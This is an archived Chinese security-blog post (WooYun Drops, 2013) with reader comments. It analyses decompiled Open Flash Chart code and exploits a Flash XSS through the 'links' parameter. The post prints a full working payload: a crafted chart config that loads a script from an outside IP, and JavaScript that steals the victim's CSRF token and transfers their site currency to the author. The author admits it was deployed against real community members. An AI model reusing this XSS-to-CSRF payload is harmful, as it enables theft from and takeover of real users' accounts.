@@ -1,0 +1,124 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">闲扯下午引爆乌云社区“盗窃”乌云币事件</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">心伤的胖子</a> <span class="bull">·</span> <time title="2013/07/30 21:56" ui-time="" datetime="2013/07/30 21:56" class="published ng-binding ng-isolate-scope">2013/07/30 21:56</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>起因</h2><hr><p>请各位看官看这里：<a href="http://zone.wooyun.org/content/4997">http://zone.wooyun.org/content/4997</a></p><p>斗胆分析下漏洞细节，在 <a href="http://www.showmycode.com/">http://www.showmycode.com/</a> 上面反编译该 flash 代码。</p><p>搜索，配置文件是通过 data 参数传入进去的，搜索 _root.data，找到如下代码：</p><pre><code>#!as3
+var lv = new LoadVars();
+lv.onLoad = LoadVarsOnLoad;
+lv.make_chart = make_chart;
+lv.make_pie = make_pie;
+if (_root.data == undefined) {
+    if (_root.variables == undefined) {
+        _root.data = "C:\\Users\\John\\Documents\\flash\\svn\\data-files\\data-47.txt";
+        lv.load(_root.data);
+    } else {
+        _root.LoadVarsOnLoad = LoadVarsOnLoad;
+        _root.LoadVarsOnLoad(true);
+    }
+} else {
+    lv.load(_root.data);
+}
+</code></pre><p>通过 LoadVars 载入的，LoadVars 载入的数据是以 &amp; 符号分割的，载入完成调用 LoadVarsOnLoad 函数。跟进去看代码</p><pre><code>#!as3
+function LoadVarsOnLoad(success) {
+    if (!success) {
+        _root.loading.done();
+        _root.oops(_root.data);
+        return(undefined);
+    }
+    if (_root.oops != undefined) {
+        removeMovieClip("oops");
+    }
+    for (i in _root) {
+        if (typeof(_root[i]) == "movieclip") {
+            removeMovieClip(_root[i]);
+        }
+        delete i;
+    }
+    _root.css = new Css("margin-top: 30;margin-right: 40;");
+    NumberFormat.getInstance(this);
+    NumberFormat.getInstanceY2(this);
+    _root._background = new Background(this);
+    if (this.pie != undefined) {
+        this.make_pie();
+    } else {
+        this.make_chart();
+    }
+    if (this.tool_tip != undefined) {
+        _root.tool_tip_wrapper = this.tool_tip.replace("#comma#", ",");
+    }
+    _root.loading.done();
+    _root.move();
+}
+</code></pre><p>看下面，如果外部数据中有 pie ，就调用 this.make_pie()。</p><pre><code>#!as3
+if (this.pie != undefined) {
+        this.make_pie();
+}
+</code></pre><p>搜索 make_pie 这个函数看代码，有如下，调用了 new PieStyle(this, "pie");</p><pre><code>#!as3
+function make_pie() {
+    _root._pie = new PieStyle(this, "pie");
+    _root._title = new Title(this);
+}
+</code></pre><p>继续跟进去，在这个类中的初始化函数最开始有 links = lv.links.split(","); ，lv.links 从外部传入通过 split 后放入 links ，最后调用了 set_values(_local6)，继续看 set_values 函数，有如下代码：</p><pre><code>#!as3
+function set_values(v) {
+    super.set_values(v);
+    pie_mcs = new Array(values.length);
+    var _local4 = 0;
+    while (_local4 &lt; values.length) {
+        var _local5 = _root.createEmptyMovieClip((name + "_") + _local4, _root.getNextHighestDepth());
+        _local5.onRollOver = function () {
+            ChartUtil.FadeIn(this, true);
+        };
+        _local5.onRollOut = function () {
+            ChartUtil.FadeOut(this);
+        };
+        if (links.length &gt; _local4) {
+            _local5._ofc_link = links[_local4];
+            _local5.onRelease = function () {
+                trace(this._ofc_link);
+                getURL (this._ofc_link);
+            };
+        }
+        var _local6 = {x_label:labels[_local4], value:values[_local4], key:"??"};
+        _local5.tooltip = _local6;
+        pie_mcs[_local4] = _local5;
+        _local4++;
+    }
+    valPos();
+}
+</code></pre><p>这个函数是关键，遍历 links，然后放入 getURL 中，因为 getURL 这里是可以执行 js 代码的。</p><h2>利用</h2><hr><p>既然可以 xss，那就可以绕过 token 机制，对 wooyun 的业务进行操作了，先来看下如何构造远程数据。看如下代码：</p><pre><code>&amp;title=腾讯高危漏洞一览表（点击类别可以查看详情）,{font-size:18px; color: #d01f3c}&amp;
+&amp;x_axis_steps=1&amp;
+&amp;y_ticks=50,50&amp;
+&amp;line=2,#87421F&amp;
+&amp;y_min=0&amp;
+&amp;y_max=20&amp;
+&amp;pie=60,#E4F0DB,{display:none;},1,,1&amp;
+&amp;values=50,50&amp;
+&amp;pie_labels=远程命令执行,腾讯客户端溢出&amp;
+&amp;colours=#d01f3c,#356aa0&amp;
+&amp;links=javascript:window.s=document.createElement('script');window.s.src='http://42.96.150.181/data.js';document.body.appendChild(window.s);,javascript:window.s=document.createElement('script');window.s.src='http://42.96.150.181/data.js';document.body.appendChild(window.s);&amp;
+&amp;tool_tip=类别%3A+%23x_label%23%3Cbr%3E比例%3A+%23val%23%25&amp;
+</code></pre><p>起了个很响亮的标题明“腾讯高危漏洞一览表（点击类别可以查看详情）”，让看到的很很有欲望点击中间的圆圈圈有木有，链接写成</p><pre><code>javascript:window.s=document.createElement('script');window.s.src='http://42.96.150.181/data.js';document.body.appendChild(window.s);
+</code></pre><p>加载我们的 js 文件。</p><p>js 文件的代码如下：</p><pre><code>#!javascript
+/*
+ * ajax
+ */
+ajax = function(url, params, callback) {
+    (params instanceof Function) &amp;&amp; (callback = params, params = void(0));
+    var XHR = (window.XDomainRequest) || window.XMLHttpRequest || (function() {
+        return new ActiveXObject('MSXML2.XMLHTTP')
+    });
+    var xhr = new XHR();
+    xhr.open(params ? 'post' : 'get', url);
+    xhr.withCredentials = true;
+    try {
+        params &amp;&amp; xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
+    } catch (e) {}
+    callback &amp;&amp; (xhr.onreadystatechange = function() {
+        (this.readyState == 4 &amp;&amp; ((this.status &gt;= 200 &amp;&amp; this.status &lt;= 300) || this.status == 304)) &amp;&amp; callback.apply(
+this, arguments);
+    });
+    xhr.send(params);
+};
+
+ajax("http://www.wooyun.org/user.php?action=update", function(){
+    var token = this.responseText.match(/token" value=\"(.+?)\"/)[1]
+    ajax("http://www.wooyun.org/user.php?action=coin&amp;do=action_submit", "token=" + token + "&amp;to_whitehat=xsser&amp;to_coin=
+1");
+})
+</code></pre><p>借用 sogili xss.js 中的 ajax 代码，先获取当前用户的 token，然后再进行转账操作。</p><h2>效果</h2><hr><p>来找个实战的地方，发到 wooyun，见这里：<a href="http://zone.wooyun.org/content/5548">http://zone.wooyun.org/content/5548</a></p><h2>后续</h2><hr><p>其实我没想到这么多人中招的，本来抱着娱乐的目的玩玩的，看来好多人情绪很高涨，在这里先对各位抱个歉。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/44" rel="bookmark" id="re1">一次SWF XSS挖掘和利用</a></li><li><a href="http://drops.wooyun.org/papers/501" rel="bookmark" id="re2">CVE-2012-0053详解</a></li><li><a href="http://drops.wooyun.org/papers/512" rel="bookmark" id="re3">Short XSS</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-05-21 15:16:08</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">心伤的胖子</span> <span class="reply-time">2013-09-17 23:55:07</span></div><p></p><p>http://42.96.150.181/</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">熊猫</span> <span class="reply-time">2013-08-01 18:00:55</span></div><p></p><p>0.0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hijack</span> <span class="reply-time">2013-07-31 18:36:55</span></div><p></p><p>还好我来晚了 哈哈， 猥琐啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ocean</span> <span class="reply-time">2013-07-31 15:42:29</span></div><p></p><p>还我WB！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">charles</span> <span class="reply-time">2013-07-31 10:47:26</span></div><p></p><p>丢WB的都可以联系你了。~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">VIP</span> <span class="reply-time">2013-07-31 08:04:47</span></div><p></p><p>那正常的操作怎么读取呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2013-07-31 07:56:18</span></div><p></p><p>token应该存httponly的cookie</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">VIP</span> <span class="reply-time">2013-07-31 07:54:39</span></div><p></p><p>while(1){}把你的wb转光</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bboy</span> <span class="reply-time">2013-07-31 04:51:52</span></div><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bboy</span> <span class="reply-time">2013-07-31 04:37:00</span></div><p></p><p>小伙子你摊上事了,你摊上大事了.等着FUCK吧.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">juuxdd</span> <span class="reply-time">2013-07-31 00:14:22</span></div><p></p><p>m</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">z7y</span> <span class="reply-time">2013-07-30 23:43:29</span></div><p></p><p>VIP这死家伙,难怪老是找我要token！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小色</span> <span class="reply-time">2013-07-30 23:31:14</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2013-07-30 23:13:28</span></div><p></p><p>把肉肉的WB吞了，哈哈。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">淡漠天空</span> <span class="reply-time">2013-07-30 23:07:58</span></div><p></p><p>js token 支持下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冉冉升起</span> <span class="reply-time">2013-07-30 22:54:52</span></div><p></p><p>虽然我看不懂代码，留着以后看！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2013-07-30 22:48:50</span></div><p></p><p>牛逼！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2013-07-30 22:46:29</span></div><p></p><p>太狠了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mango</span> <span class="reply-time">2013-07-30 22:37:43</span></div><p></p><p>还我WB</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">剑心</span> <span class="reply-time">2013-07-30 22:33:05</span></div><p></p><p>哥已经把收到的wb全送你了，要还钱的人请找洞主。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2013-07-30 22:30:42</span></div><p></p><p>谁淫荡啊你淫荡……</p><p></p></div></div></div></div></div></main>
